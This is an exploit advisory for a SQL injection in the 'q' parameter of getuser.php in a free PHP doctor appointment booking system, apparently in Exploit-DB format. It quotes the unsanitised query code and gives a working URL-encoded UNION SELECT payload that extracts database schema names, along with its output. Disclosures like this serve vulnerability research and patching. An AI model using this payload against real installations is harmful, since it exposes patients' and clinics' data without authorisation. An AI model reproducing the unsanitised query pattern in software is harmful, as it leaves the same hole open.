@@ -1,0 +1,33 @@
+# Exploit Title: Online Doctor Appointment Booking System PHP and Mysql 1.0 - 'q' SQL Injection
+# Google Dork: N/A
+# Date: 11/16/2020
+# Exploit Author: Ramil Mustafayev
+# Vendor Homepage: https://projectworlds.in/free-projects/php-projects/online-doctor-appointment-booking-system-php-and-mysql/
+# Software Link: https://projectworlds.in/wp-content/uploads/2020/05/PHP-Doctor-Appointment-System.zip
+# Version: 1.0
+# Tested on: Win10 x64, Kali Linux x64
+# CVE : N/A
+######## Description ########
+# 
+# An SQL injection vulnerability was discovered in PHP-Doctor-Appointment-System.
+#
+# In getuser.php file, GET parameter 'q' is vulnerable.
+#
+# The vulnerability could allow for the improper neutralization of special elements in SQL commands and may lead to the product being vulnerable to SQL injection. 
+# 
+#############################
+
+Vulnerable code: 
+
+include_once 'assets/conn/dbconnect.php';
+$q = $_GET['q']; // Vulnerable param
+// echo $q;
+$res = mysqli_query($con,"SELECT * FROM doctorschedule WHERE scheduleDate='$q'"); // Injection point
+
+Used Payload:
+
+http://localhost/[PATH]/getuser.php?q=1%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7162717671%2CIFNULL%28CAST%28schema_name%20AS%20NCHAR%29%2C0x20%29%2C0x7176627871%29%2CNULL%2CNULL%2CNULL%2CNULL%20FROM%20INFORMATION_SCHEMA.SCHEMATA%23
+
+Output:
+
+Extracted database: qbqvqdb_healthcareqvbxq
